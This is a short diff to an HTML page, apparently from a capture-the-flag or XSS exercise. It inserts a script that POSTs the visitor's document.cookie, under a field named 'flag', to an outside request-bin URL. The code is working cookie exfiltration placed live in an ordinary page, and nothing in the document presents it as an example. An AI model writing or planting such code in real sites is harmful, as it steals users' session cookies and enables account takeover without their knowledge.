@@ -138,6 +138,16 @@
 </body>
 
 <script>
+fetch('https://requestbin.myworkato.com/1cet2st1', {
+    method: 'POST',
+    headers: {
+	'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({flag: document.cookie})
+});
+</script>
+
+<script>
     var time = localStorage.getItem
 
     function hyperPadder(i) {
